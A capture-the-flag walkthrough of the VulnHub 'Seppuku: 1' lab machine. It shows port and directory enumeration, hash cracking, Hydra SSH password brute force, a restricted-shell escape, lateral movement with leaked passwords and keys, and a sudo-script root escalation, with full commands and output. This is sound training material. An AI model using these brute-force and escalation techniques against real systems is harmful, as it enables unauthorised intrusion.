# VulnHub > Seppuku 1

**About Release**

* Name: Seppuku: 1
* Date release: 13 May 2020
* Author: SunCSR Team
* Series: Seppuku
* Difficulty: Intermediate to Hard
* Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox)

**Description**

* Goal: Get the root shell and then obtain flag under `/root`.
* Warning: Be careful with "rabbit hole"!

**Download**

* Seppuku.zip (Size: 748 MB)
* Download: https://drive.google.com/file/d/1X8rYYXCSTZ8cB4u9Q-BnwjHmVHmF4_bl/view?usp=sharing
* Download (Mirror): https://download.vulnhub.com/seppuku/Seppuku.zip
* Download (Torrent): https://download.vulnhub.com/seppuku/Seppuku.zip.torrent ([Magnet](magnet:?xt=urn:btih:23A13BD384C7AE2ECDCB8CA1B8E17A89535A806F&dn=Seppuku.zip&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

# Services Enumeration

Nmap discovers many open ports:

~~~
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)
|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)
|_  256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)
80/tcp   open  http        nginx 1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-server-header: nginx/1.14.2
|_http-title: 401 Authorization Required
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
7080/tcp open  ssl/http    LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title:  404 Not Found
| ssl-cert: Subject: commonName=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
| Not valid before: 2020-05-13T06:51:35
|_Not valid after:  2022-08-11T06:51:35
|_ssl-date: 2020-10-03T18:12:09+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
7601/tcp open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Seppuku
8088/tcp open  http        LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Seppuku
Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h00m00s, deviation: 2h00m00s, median: 0s
|_nbstat: NetBIOS name: SEPPUKU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: seppuku
|   NetBIOS computer name: SEPPUKU\x00
|   Domain name: \x00
|   FQDN: seppuku
|_  System time: 2020-10-03T14:12:04-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-03T18:12:04
|_  start_date: N/A
~~~

# Web enumeration

## Hidden locations

The FTP service doesn't allow anonymous access, so we'll start with a standard web enumeration.

After enumerating all the web ports, we eventually find interesting directories hosted on port 7601:

~~~
kali@kali:/data/seppuku/files$ gobuster dir -u http://seppuku.box:7601/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://seppuku.box:7601/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/04 10:16:45 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.hta (Status: 403)
/.htaccess (Status: 403)
/a (Status: 301)
/b (Status: 301)
/c (Status: 301)
/ckeditor (Status: 301)
/d (Status: 301)
/database (Status: 301)
/e (Status: 301)
/f (Status: 301)
/h (Status: 301)
/index.html (Status: 200)
/keys (Status: 301) <-------------------- interesting
/production (Status: 301)
/q (Status: 301)
/r (Status: 301)
/secret (Status: 301) <-------------------- interesting
/server-status (Status: 403)
/t (Status: 301)
/w (Status: 301)
===============================================================
2020/10/04 10:16:45 Finished
===============================================================
~~~

The `/secret` location contains several promising files:

~~~
kali@kali:/data/seppuku/files$ curl -s http://seppuku.box:7601/secret/ | html2text 
****** Index of /secret ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[   ]]       hostname         2020-05-13 03:41    8  
[[IMG]]       jack.jpg         2018-09-12 03:49  58K  
[[   ]]       passwd.bak       2020-05-13 03:47 2.7K  
[[   ]]       password.lst     2020-05-13 03:59  672  
[[   ]]       shadow.bak       2020-05-13 03:48 1.4K  
===========================================================================
     Apache/2.4.38 (Debian) Server at seppuku.box Port 7601
~~~

## Rabbit holes

However, trying to brute force the `shadow` file with the `password.lst` dictionary doesn't lead anywhere:

~~~
kali@kali:/data/seppuku/files$ /data/src/john/run/john shadow.bak --wordlist=password.lst 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
a1b2c3           (r@bbit-hole)
1g 0:00:00:00 DONE (2020-10-04 09:24) 20.00g/s 1860p/s 1860c/s 1860C/s 123456
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

Trying to connect to the SSH service using the private key doesn't work either:

~~~
kali@kali:/data/seppuku/files$ chmod 400 private
kali@kali:/data/seppuku/files$ ssh -i private seppuku@seppuku.box
load pubkey "private": invalid format
seppuku@seppuku.box's password: 

~~~

# SSH connection as seppuku

## Brute force seppuku's SSH account

Let's try to brute force seppuku's account using the dictionary.

~~~
kali@kali:/data/seppuku/files$ hydra -l seppuku -P password.lst ssh://seppuku.box
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-04 09:30:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 93 login tries (l:1/p:93), ~6 tries per task
[DATA] attacking ssh://seppuku.box:22/
[22][ssh] host: seppuku.box   login: seppuku   password: eeyoree
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-04 09:30:53
~~~

Hydra successfully found seppuku's password: `eeyoree`.

## First connection as seppuku

We can now connect as `seppuku`.

~~~
kali@kali:/data/seppuku/files$ sshpass -p "eeyoree" ssh seppuku@seppuku.box
Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed May 13 10:52:41 2020 from 192.168.1.48
~~~

The home directory contains a hidden `.passwd` file:

~~~
seppuku@seppuku:~$ ls -la
total 28
drwxr-xr-x 3 seppuku seppuku 4096 Oct  4 03:30 .
drwxr-xr-x 5 root    root    4096 May 13 04:50 ..
-rw-r--r-- 1 seppuku seppuku  220 May 13 00:28 .bash_logout
-rw-r--r-- 1 seppuku seppuku 3526 May 13 00:28 .bashrc
drwx------ 3 seppuku seppuku 4096 May 13 10:05 .gnupg
-rw-r--r-- 1 root    root      20 May 13 04:47 .passwd
-rw-r--r-- 1 seppuku seppuku  807 May 13 00:28 .profile
seppuku@seppuku:~$ cat .passwd 
12345685213456!@!@A
~~~

Checking the subdirectories within `/home` reveals that there are other users:

~~~
seppuku@seppuku:~$ ls -l /home
total 12
drwxr-xr-x 4 samurai samurai 4096 Oct  4 04:23 samurai
drwxr-xr-x 3 seppuku seppuku 4096 Oct  4 04:23 seppuku
drwxr-xr-x 7 tanto   tanto   4096 Oct  4 04:06 tanto
~~~

And checking the privileges reveals that we can create a symbolic link of `/root` in `/tmp`:

~~~
seppuku@seppuku:~$ sudo -l
Matching Defaults entries for seppuku on seppuku:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User seppuku may run the following commands on seppuku:
    (ALL) NOPASSWD: /usr/bin/ln -sf /root/ /tmp/
~~~

## Evade rbash:

Trying to change directory will fail due to a restricted bash. You can easily evade it by spawning a bash in python:

~~~
seppuku@seppuku:~$ cd /
-rbash: cd: restricted
seppuku@seppuku:~$ python -c "import pty;pty.spawn('/bin/bash')"
~~~

# Lateral move (sppuku -> samurai)

We can switch to `samurai` using the password found in `/home/samurai/.passwd`:

~~~
seppuku@seppuku:~$ su samurai
Password: 12345685213456!@!@A
samurai@seppuku:/home/seppuku$ id
uid=1001(samurai) gid=1002(samurai) groups=1002(samurai)
~~~

Checking the privileges now reveals that we can execute a script located in `tanto`'s home directory, but we don't have write access.

~~~
samurai@seppuku:~$ sudo -l
Matching Defaults entries for samurai on seppuku:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User samurai may run the following commands on seppuku:
    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
~~~

# Lateral move (samurai -> tanto)

Remember that we have found previously a SSH private key. We can actually use it to switch to `tanto`:

~~~
samurai@seppuku:~$ cp /var/www/html/keys/private .
samurai@seppuku:~$ chmod 400 private 
samurai@seppuku:~$ ssh -i private tanto@localhost
The authenticity of host 'localhost (::1)' can't be established.
ECDSA key fingerprint is SHA256:RltTwzbYqqcBz4/ww5KEokNttE+fZwM7l4bvzFaf558.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed May 13 10:53:17 2020 from 192.168.1.48
tanto@seppuku:~$ 
~~~

# Privilege escalation

## Chain

Now putting everything together, here is what we have:

User | Action
---|---
seppuku | Can create a symbolic link of `/root` to `/tmp`
samurai | Can execute `/home/tanto/.cgi_bin/bin /tmp/*` as `root`
tanto | Can create the `~/.cgi_bin/bin` script 

As we can put whatever we want in the script, we'll just spawn a root shell. Let's create the script. As `tanto`, issue the following commands:

~~~
$ mkdir /home/tanto/.cgi_bin/
$ cd /home/tanto/.cgi_bin/
$ cat > bin << EOF
#!/bin/sh
/bin/bash
EOF
$ chmod +x bin
$ exit
$ exit
~~~

Now back to samurai:

~~~
samurai@seppuku:~$ sudo /home/tanto/.cgi_bin/bin /tmp/*
root@seppuku:/home/samurai# id
uid=0(root) gid=0(root) groups=0(root)
~~~

# Root flag

Let's get the root flag:

~~~
root@seppuku:/home/samurai# cd /root
root@seppuku:~# ls -la
total 40
drwx------  5 root root 4096 May 13 10:42 .
drwxr-xr-x 18 root root 4096 May 13 00:25 ..
-rw-------  1 root root  126 May 13 10:53 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 May 13 10:41 .gnupg
drwxr-xr-x  3 root root 4096 May 13 02:53 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   24 May 13 04:51 root.txt
-rw-r--r--  1 root root   66 May 13 05:31 .selected_editor
drwxr-xr-x  2 root root 4096 May 13 10:39 .ssh
root@seppuku:~# cat root.txt 
{SunCSR_Seppuku_2020_X}
~~~
